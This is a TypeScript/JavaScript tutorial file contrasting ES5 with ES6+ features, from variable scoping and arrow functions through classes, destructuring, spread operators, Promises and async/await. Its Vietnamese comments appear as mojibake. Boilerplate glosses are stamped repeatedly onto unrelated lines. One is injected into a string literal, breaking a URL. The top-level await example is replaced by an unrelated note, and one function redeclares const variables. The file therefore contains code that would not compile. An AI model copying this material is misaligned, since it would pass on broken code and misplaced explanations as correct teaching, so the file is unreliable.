‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Code Example - Comprehensive Comparison:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. VARIABLES - var vs let/const
 // Ch√∫ gi·∫£i: ============================================

 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
// C√°ch ho·∫°t ƒë·ªông: var ƒë∆∞·ª£c hoist l√™n ƒë·∫ßu function scope
function es5Variables() {
  console.log(x); // undefined (hoisted nh∆∞ng ch∆∞a g√°n gi√° tr·ªã)
  var x = 10; // Function scoped - accessible trong to√†n b·ªô function

  if (true) {
    var x = 20; // C√ôNG bi·∫øn x (kh√¥ng t·∫°o scope m·ªõi)
  }

  console.log(x); // 20 (b·ªã ghi ƒë√® b·ªüi if block)

  // var c√≥ th·ªÉ redeclare
  var x = 30; // ‚úÖ OK - kh√¥ng error
  console.log(x); // Ch√∫ gi·∫£i: 30
}

 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm.
// C√°ch ho·∫°t ƒë·ªông: let/const ch·ªâ t·ªìn t·∫°i trong {} block, c√≥ TDZ
function es6Variables() {
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  // Temporal Dead Zone (TDZ) - t·ª´ ƒë·∫ßu block ƒë·∫øn khi declare

  let y = 10; // Block scoped - ch·ªâ trong function n√†y
  const z = 100; // Immutable reference - kh√¥ng th·ªÉ reassign

  if (true) {
    let y = 20; // BI·∫æN M·ªöI - scope ri√™ng trong if block
    const z = 200; // BI·∫æN M·ªöI - scope ri√™ng

    console.log(y); // 20 (bi·∫øn local c·ªßa if)
    console.log(z); // Ch√∫ gi·∫£i: 200
  }

  console.log(y); // 10 (bi·∫øn c·ªßa function scope, kh√¥ng b·ªã ·∫£nh h∆∞·ªüng)
  console.log(z); // Ch√∫ gi·∫£i: 100

 // Ch√∫ gi·∫£i: let y = 30;  // ‚ùå SyntaxError: Identifier 'y' has already been declared
 // Ch√∫ gi·∫£i: z = 300;     // ‚ùå TypeError: Assignment to constant variable

 // Ch√∫ gi·∫£i: `const` v·ªõi object:
  // - `const` KH√ìA reference (binding) ‚Äî kh√¥ng th·ªÉ g√°n l·∫°i bi·∫øn (`obj = {...}` s·∫Ω l·ªói)
  // - NH∆ØNG n·ªôi dung object (properties) V·∫™N c√≥ th·ªÉ thay ƒë·ªïi (mutable)
  // => N·∫øu mu·ªën object b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ shallow), pattern b·∫•t bi·∫øn ho·∫∑c th∆∞ vi·ªán nh∆∞ Immer
  const obj = { name: 'John' };
  obj.name = 'Jane'; // ‚úÖ OK - thay ƒë·ªïi property v·∫´n h·ª£p l·ªá
  // obj = {};      // ‚ùå Error - kh√¥ng th·ªÉ reassign reference
}

// Hoisting Comparison (C√°ch ho·∫°t ƒë·ªông c·ªßa hoisting)
console.log('=== VAR HOISTING ===');
console.log(varVariable); // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
var varVariable = 'ES5';

console.log('=== LET/CONST HOISTING ===');
 // V√πng ch·∫øt t·∫°m th·ªùi (TDZ): `let/const` kh√¥ng th·ªÉ truy c·∫≠p tr∆∞·ªõc khi kh·ªüi t·∫°o, g√¢y `ReferenceError` n·∫øu truy c·∫≠p s·ªõm. Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
let letVariable = 'ES6';
 // Ch√∫ gi·∫£i: const constVariable; // ‚ùå SyntaxError - const ph·∫£i init ngay

 // Ch√∫ gi·∫£i: ============================================
 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
 // Ch√∫ gi·∫£i: ============================================

// üî¥ ES5 - Regular Functions (c√≥ own this binding)
// C√°ch ho·∫°t ƒë·ªông: this binding dynamic, ph·ª• thu·ªôc v√†o c√°ch g·ªçi
var Calculator = {
  value: 0,

 // Ch√∫ gi·∫£i: Method v·ªõi regular function
  add: function (num) {
    this.value += num; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    return this.value;
  },

 // Ch√∫ gi·∫£i: Callback problem
  delayedAdd: function (num) {
    setTimeout(function () {
      // this ·ªü ƒë√¢y = window (ho·∫∑c undefined trong strict mode)
      // Kh√¥ng ph·∫£i Calculator object!
      console.log(this); // Ch√∫ gi·∫£i: window/undefined
      // this.value += num; // ‚ùå Error ho·∫∑c NaN
    }, 1000);
  },

  // ES5 solution: bind ho·∫∑c that = this
  delayedAddFixed: function (num) {
    var that = this; // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
    setTimeout(function () {
      that.value += num; // ‚úÖ Ho·∫°t ƒë·ªông
    }, 1000);
  },

  // Ho·∫∑c d√πng bind
  delayedAddBind: function (num) {
    setTimeout(
      function () {
        this.value += num; // ‚úÖ Ho·∫°t ƒë·ªông v√¨ ƒë√£ bind
      }.bind(this),
      1000
    );
  },
};

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
// C√°ch ho·∫°t ƒë·ªông: Arrow function KH√îNG c√≥ own this, inherit t·ª´ parent scope
const ModernCalculator = {
  value: 0,

 // Ch√∫ gi·∫£i: Method shorthand syntax
  add(num: number) {
    this.value += num;
    return this.value;
  },

  // Arrow function trong callback - this t·ª± ƒë·ªông ƒë√∫ng
  delayedAdd(num: number) {
    setTimeout(() => {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
      this.value += num; // ‚úÖ Ho·∫°t ƒë·ªông perfect
    }, 1000);
  },

  // Arrow function kh√¥ng th·ªÉ d√πng l√†m constructor
  // MyClass: () => { } // ‚ùå Kh√¥ng c√≥ prototype, kh√¥ng th·ªÉ new
};

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
const simple = (x: number) => x * 2; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
const withBlock = (x: number) => {
  const result = x * 2;
  return result; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
};
const noParams = () => console.log('Hello'); // Ch√∫ gi·∫£i: No parameters
const oneParam = (x) => x * 2; // Single param - c√≥ th·ªÉ b·ªè ()
const multiParams = (x: number, y: number) => x + y; // Ch√∫ gi·∫£i: Multiple params - c·∫ßn ()
const returnObject = () => ({ name: 'John' }); // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).

 // Ch√∫ gi·∫£i: ============================================
 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
 // Ch√∫ gi·∫£i: ============================================

 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
// C√°ch ho·∫°t ƒë·ªông: Constructor function + prototype chain
function Animal(name) {
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  this.name = name; // Ch√∫ gi·∫£i: Instance property
}

// Methods tr√™n prototype (share gi·ªØa instances)
Animal.prototype.speak = function () {
  console.log(this.name + ' makes a sound');
};

 // Ch√∫ gi·∫£i: Static methods
Animal.createAnimal = function (name) {
  return new Animal(name);
};

 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
function Dog(name, breed) {
  Animal.call(this, name); // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  this.breed = breed;
}

 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog; // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object. Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.

 // Ch√∫ gi·∫£i: Override method
Dog.prototype.speak = function () {
  console.log(this.name + ' barks!');
};

const dog = new Dog('Rex', 'Labrador');
dog.speak(); // Ch√∫ gi·∫£i: "Rex barks!"

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Class Syntax (Syntactic Sugar)
// C√°ch ho·∫°t ƒë·ªông: B√™n trong v·∫´n l√† prototype, nh∆∞ng syntax d·ªÖ ƒë·ªçc h∆°n
class ModernAnimal {
 // Ch√∫ gi·∫£i: Class fields (ES2022)
  species = 'Unknown'; // Ch√∫ gi·∫£i: Public field

 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  constructor(public name: string) {
 // Ch√∫ gi·∫£i: Parameter properties (TypeScript)
    // T·ª± ƒë·ªông t·∫°o this.name = name
  }

  // Instance method (tr√™n prototype)
  speak() {
    console.log(`${this.name} makes a sound`);
  }

  // Static method (tr√™n class itself)
  static createAnimal(name: string) {
    return new ModernAnimal(name);
  }

 // Ch√∫ gi·∫£i: Getter
  get info() {
    return `Animal: ${this.name}`;
  }

 // Ch√∫ gi·∫£i: Setter
  set info(value: string) {
    this.name = value.replace('Animal: ', '');
  }
}

 // Ch√∫ gi·∫£i: Inheritance v·ªõi extends
class ModernDog extends ModernAnimal {
  constructor(name: string, public breed: string) {
    super(name); // G·ªçi parent constructor - B·∫ÆT BU·ªòC
    // Ph·∫£i call super() tr∆∞·ªõc khi d√πng this
  }

 // Ch√∫ gi·∫£i: Override method
  speak() {
    console.log(`${this.name} barks!`);
  }

 // Ch√∫ gi·∫£i: Call parent method
  speakLikeParent() {
    super.speak(); // Ch√∫ gi·∫£i: G·ªçi Animal.speak()
  }

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i. Tr∆∞·ªùng private b·∫Øt ƒë·∫ßu b·∫±ng `#` ch·ªâ c√≥ th·ªÉ truy c·∫≠p trong class, g√¢y l·ªói khi truy c·∫≠p ngo√†i.
  #privateField = 'secret'; // Ch√∫ gi·∫£i: Ch·ªâ accessible trong class

  getPrivate() {
    return this.#privateField; // Ch√∫ gi·∫£i: ‚úÖ OK
  }
}

const modernDog = new ModernDog('Rex', 'Labrador');
modernDog.speak(); // Ch√∫ gi·∫£i: "Rex barks!"
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i. Tr∆∞·ªùng private b·∫Øt ƒë·∫ßu b·∫±ng `#` ch·ªâ c√≥ th·ªÉ truy c·∫≠p trong class, g√¢y l·ªói khi truy c·∫≠p ngo√†i.

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. TEMPLATE LITERALS vs String Concatenation
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî¥ ES5 - String Concatenation (verbose, error-prone)
var name = 'John';
var age = 25;
var city = 'Ha Noi';

 // Ch√∫ gi·∫£i: Single line
var message = 'Hello ' + name + ', you are ' + age + ' years old';

// Multi-line (ph·∫£i d√πng \n v√† +)
var multiLine =
  'Name: ' +
  name +
  '\n' +
  'Age: ' +
  age +
  '\n' +
  'City: ' +
  city;

 // Ch√∫ gi·∫£i: HTML generation (nightmare)
var html =
  '<div class="user">' +
  '<h2>' +
  name +
  '</h2>' +
  '<p>Age: ' +
  age +
  '</p>' +
  '<p>City: ' +
  city +
  '</p>' +
  '</div>';

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Template Literals (clean, readable)
// C√°ch ho·∫°t ƒë·ªông: Backticks `` cho ph√©p embedded expressions ${} v√† multi-line
const modernMessage = `Hello ${name}, you are ${age} years old`;

// Multi-line (t·ª± nhi√™n, gi·ªØ nguy√™n indentation)
const modernMultiLine = `
  Name: ${name}
  Age: ${age}
  City: ${city}
`;

// Expression trong template (kh√¥ng ch·ªâ variables)
const calculation = `2 + 2 = ${2 + 2}`; // Ch√∫ gi·∫£i: "2 + 2 = 4"
const conditional = `Status: ${age >= 18 ? 'Adult' : 'Minor'}`; // Ch√∫ gi·∫£i: Ternary
const methodCall = `Upper: ${name.toUpperCase()}`; // Ch√∫ gi·∫£i: Method call

// HTML generation (d·ªÖ ƒë·ªçc h∆°n nhi·ªÅu)
const modernHtml = `
  <div class="user">
    <h2>${name}</h2>
    <p>Age: ${age}</p>
    <p>City: ${city}</p>
  </div>
`;

 // Ch√∫ gi·∫£i: Tagged Templates (advanced feature)
function highlight(strings: TemplateStringsArray, ...values: any[]) {
  return strings.reduce((result, str, i) => {
    return result + str + (values[i] ? `<mark>${values[i]}</mark>` : '');
  }, '');
}

const highlighted = highlight`Hello ${name}, you are ${age} years old`;
 // Ch√∫ gi·∫£i: "Hello <mark>John</mark>, you are <mark>25</mark> years old"

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 5. DESTRUCTURING - Elegant Data Extraction
 // Ch√∫ gi·∫£i: ============================================

const user = {
  name: 'John Doe',
  age: 30,
  address: {
    city: 'Ha Noi',
    country: 'Vietnam',
  },
  hobbies: ['coding', 'reading'],
};

 // Ch√∫ gi·∫£i: üî¥ ES5 - Manual Assignment (verbose, repetitive)
var userName = user.name;
var userAge = user.age;
var userCity = user.address.city;
var userCountry = user.address.country;
var firstHobby = user.hobbies[0];
var secondHobby = user.hobbies[1];

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Destructuring (concise, readable)
 // Ch√∫ gi·∫£i: Object destructuring
const { name: userName2, age: userAge2 } = user; // Ch√∫ gi·∫£i: Rename variables

 // Ch√∫ gi·∫£i: Nested destructuring
const {
  address: { city, country },
} = user;

 // Ch√∫ gi·∫£i: Array destructuring
const [firstHobby2, secondHobby2] = user.hobbies;

 // Ch√∫ gi·∫£i: Default values
const { email = 'no-email@example.com' } = user; // email kh√¥ng t·ªìn t·∫°i ‚Üí d√πng default

// Rest properties (l·∫•y ph·∫ßn c√≤n l·∫°i)
const { name: n, ...rest } = user; // Ch√∫ gi·∫£i: rest = { age, address, hobbies }

 // Ch√∫ gi·∫£i: Function parameter destructuring
function greetUser({ name, age }: { name: string; age: number }) {
  console.log(`Hello ${name}, ${age} years old`);
}

greetUser(user); // Truy·ªÅn object, t·ª± ƒë·ªông destructure

 // Ch√∫ gi·∫£i: Array destructuring v·ªõi skip
const numbers = [1, 2, 3, 4, 5];
const [first, , third] = numbers; // Ch√∫ gi·∫£i: Skip second element

 // Ch√∫ gi·∫£i: Swap variables (elegant)
let a = 1,
  b = 2;
[a, b] = [b, a]; // a=2, b=1 (kh√¥ng c·∫ßn temp variable)

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6. SPREAD & REST OPERATORS
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî¥ ES5 - Array/Object Operations (cumbersome)
var arr1 = [1, 2, 3];
var arr2 = [4, 5, 6];

 // Ch√∫ gi·∫£i: Concatenate arrays
var combined = arr1.concat(arr2); // Ch√∫ gi·∫£i: [1,2,3,4,5,6]

 // Ch√∫ gi·∫£i: Copy array
var copy = arr1.slice(); // Ch√∫ gi·∫£i: [1,2,3]

 // Ch√∫ gi·∫£i: Copy object
var obj1 = { a: 1, b: 2 };
var obj2 = Object.assign({}, obj1); // Ch√∫ gi·∫£i: { a: 1, b: 2 }

 // Ch√∫ gi·∫£i: Function v·ªõi variable arguments
function sum() {
  var args = Array.prototype.slice.call(arguments); // Ch√∫ gi·∫£i: Convert arguments to array
  return args.reduce(function (total, num) {
    return total + num;
  }, 0);
}

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Spread & Rest (intuitive, powerful)
// C√°ch ho·∫°t ƒë·ªông: ... operator "spreads" iterable elements

// Spread arrays (ph√¢n r√£ array th√†nh individual elements)
const spreadArr1 = [1, 2, 3];
const spreadArr2 = [4, 5, 6];
const spreadCombined = [...spreadArr1, ...spreadArr2]; // Ch√∫ gi·∫£i: [1,2,3,4,5,6]

 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
const spreadCopy = [...spreadArr1]; // Ch√∫ gi·∫£i: [1,2,3]

 // Ch√∫ gi·∫£i: Add elements
const withExtra = [...spreadArr1, 4, 5]; // Ch√∫ gi·∫£i: [1,2,3,4,5]
const atBeginning = [0, ...spreadArr1]; // Ch√∫ gi·∫£i: [0,1,2,3]

// Spread objects (ph√¢n r√£ object properties)
const spreadObj1 = { a: 1, b: 2 };
const spreadObj2 = { c: 3, d: 4 };
const spreadObjCombined = { ...spreadObj1, ...spreadObj2 }; // Ch√∫ gi·∫£i: {a:1, b:2, c:3, d:4}

 // Ch√∫ gi·∫£i: Override properties
const overridden = { ...spreadObj1, b: 99 }; // {a:1, b:99} - b b·ªã ghi ƒë√®

 // Ch√∫ gi·∫£i: Spread trong function calls
const maxNum = Math.max(...spreadArr1); // Ch√∫ gi·∫£i: Math.max(1, 2, 3) = 3

// Rest parameters (thu th·∫≠p remaining arguments v√†o array)
function modernSum(...numbers: number[]) {
  // numbers l√† array [1,2,3,...]
  return numbers.reduce((total, num) => total + num, 0);
}

modernSum(1, 2, 3, 4, 5); // Ch√∫ gi·∫£i: 15

 // Ch√∫ gi·∫£i: Rest in destructuring
const [head, ...tail] = [1, 2, 3, 4]; // Ch√∫ gi·∫£i: head=1, tail=[2,3,4]
const { x, ...others } = { x: 1, y: 2, z: 3 }; // Ch√∫ gi·∫£i: x=1, others={y:2, z:3}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 7. DEFAULT PARAMETERS
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî¥ ES5 - Manual Default Values
function greetES5(name, greeting) {
  // Check v√† assign default
  name = name || 'Guest'; // ‚ö†Ô∏è Falsy values (0, '', false) c≈©ng b·ªã replace
  greeting = typeof greeting !== 'undefined' ? greeting : 'Hello';

  return greeting + ' ' + name;
}

 // Ch√∫ gi·∫£i: üü¢ ES6+ - Native Default Parameters
// C√°ch ho·∫°t ƒë·ªông: Default ch·ªâ apply khi argument l√† undefined
function greetES6(name = 'Guest', greeting = 'Hello') {
  return `${greeting} ${name}`;
}

greetES6(); // Ch√∫ gi·∫£i: "Hello Guest"
greetES6('John'); // Ch√∫ gi·∫£i: "Hello John"
greetES6('John', 'Hi'); // Ch√∫ gi·∫£i: "Hi John"
greetES6(undefined, 'Hey'); // "Hey Guest" - name d√πng default

 // Ch√∫ gi·∫£i: Default v·ªõi expressions
function createUser(name = 'User', id = generateId()) {
 // Ch√∫ gi·∫£i: generateId() ch·ªâ ch·∫°y khi id undefined
  return { name, id };
}

 // Ch√∫ gi·∫£i: Default destructured parameters
function configAPI({
  url = 'https: // Ch√∫ gi·∫£i: api.example.com',
  timeout = 5000,
  retries = 3,
} = {}) {
  // = {} ƒë·ªÉ tr√°nh error khi kh√¥ng truy·ªÅn argument
  console.log({ url, timeout, retries });
}

 // Ch√∫ gi·∫£i: ============================================
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üî¥ ES5 - Callback Hell (pyramid of doom)
function fetchUserES5(userId, callback) {
  setTimeout(function () {
 // Ch√∫ gi·∫£i: Simulate API call
    var user = { id: userId, name: 'John' };

 // Ch√∫ gi·∫£i: Nested callbacks
    fetchPostsES5(userId, function (posts) {
      fetchCommentsES5(posts[0].id, function (comments) {
        fetchLikesES5(comments[0].id, function (likes) {
 // Ch√∫ gi·∫£i: üò± Callback hell - hard to read, maintain, error handle
          callback({ user, posts, comments, likes });
        });
      });
    });
  }, 100);
}

 // Ch√∫ gi·∫£i: Error handling v·ªõi callbacks (ph·ª©c t·∫°p)
function fetchDataES5(callback) {
  setTimeout(function () {
    var error = Math.random() > 0.5 ? new Error('Failed') : null;
    var data = error ? null : { value: 42 };
    callback(error, data); // Ch√∫ gi·∫£i: Node.js style: error-first callback
  }, 100);
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
// C√°ch ho·∫°t ƒë·ªông: Promise l√† object ƒë·∫°i di·ªán cho eventual completion/failure
function fetchUserES6(userId: string): Promise<any> {
  return new Promise((resolve, reject) => {
 // Ch√∫ gi·∫£i: executor function ch·∫°y immediately
    setTimeout(() => {
      const user = { id: userId, name: 'John' };
      resolve(user); // Ch√∫ gi·∫£i: Success
 // Ch√∫ gi·∫£i: reject(new Error('Failed')); // Failure
    }, 100);
  });
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
fetchUserES6('123')
  .then((user) => {
    console.log('User:', user);
    return fetchPosts(user.id); // Return promise ‚Üí chain ti·∫øp
  })
  .then((posts) => {
    console.log('Posts:', posts);
    return fetchComments(posts[0].id);
  })
  .then((comments) => {
    console.log('Comments:', comments);
    return fetchLikes(comments[0].id);
  })
  .then((likes) => {
    console.log('Likes:', likes);
  })
  .catch((error) => {
 // Ch√∫ gi·∫£i: Single catch cho t·∫•t c·∫£ errors
    console.error('Error:', error);
  })
  .finally(() => {
    // Ch·∫°y d√π th√†nh c√¥ng hay fail
    console.log('Cleanup');
  });

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
const promise1 = fetchUserES6('1');
const promise2 = fetchUserES6('2');
const promise3 = fetchUserES6('3');

// Promise.all - ch·ªù t·∫•t c·∫£ resolve (ho·∫∑c 1 reject)
Promise.all([promise1, promise2, promise3]).then((results) => {
  console.log('All users:', results); // Ch√∫ gi·∫£i: [user1, user2, user3]
});

// Promise.race - l·∫•y k·∫øt qu·∫£ c·ªßa promise nhanh nh·∫•t
Promise.race([promise1, promise2, promise3]).then((result) => {
  console.log('First user:', result); // user n√†o resolve tr∆∞·ªõc
});

// Promise.allSettled - ch·ªù t·∫•t c·∫£ settle (resolve ho·∫∑c reject)
Promise.allSettled([promise1, promise2, promise3]).then((results) => {
  results.forEach((result) => {
    if (result.status === 'fulfilled') {
      console.log('Success:', result.value);
    } else {
      console.log('Failed:', result.reason);
    }
  });
});

// Promise.any - l·∫•y promise fulfilled ƒë·∫ßu ti√™n
Promise.any([promise1, promise2, promise3]).then((result) => {
  console.log('First successful:', result);
});

 // Ch√∫ gi·∫£i: ============================================
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üü¢ ES2017 - Async/Await (looks synchronous, actually async)
// C√°ch ho·∫°t ƒë·ªông: async function t·ª± ƒë·ªông return Promise, await pause execution
async function fetchAllData() {
  try {
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
    const user = await fetchUserES6('123'); // Ch√∫ gi·∫£i: Looks synchronous!
    console.log('User:', user);

    const posts = await fetchPosts(user.id); // Ch√∫ gi·∫£i: Wait for user first
    console.log('Posts:', posts);

    const comments = await fetchComments(posts[0].id);
    console.log('Comments:', comments);

    const likes = await fetchLikes(comments[0].id);
    console.log('Likes:', likes);

    return { user, posts, comments, likes };
  } catch (error) {
 // Ch√∫ gi·∫£i: Try-catch cho error handling (nh∆∞ synchronous code)
    console.error('Error:', error);
    throw error; // Re-throw n·∫øu c·∫ßn
  } finally {
    console.log('Cleanup');
  }
}

 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
async function fetchMultipleUsers() {
  // ‚ùå Sequential (slow) - m·ªói request ƒë·ª£i previous
  const user1 = await fetchUserES6('1'); // Ch√∫ gi·∫£i: Wait 100ms
  const user2 = await fetchUserES6('2'); // Wait th√™m 100ms
  const user3 = await fetchUserES6('3'); // Wait th√™m 100ms
 // Ch√∫ gi·∫£i: Total: 300ms

  // ‚úÖ Parallel (fast) - t·∫•t c·∫£ requests c√πng l√∫c
  const [user1, user2, user3] = await Promise.all([
    fetchUserES6('1'),
    fetchUserES6('2'),
    fetchUserES6('3'),
  ]);
 // Ch√∫ gi·∫£i: Total: 100ms (ch·ªâ ch·ªù slowest request)
}

// Top-level await (ES2022) - await ngo√†i async function
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
 // Ch√∫ gi·∫£i: console.log(config); // ‚úÖ OK trong module scope

 // Ch√∫ gi·∫£i: ============================================
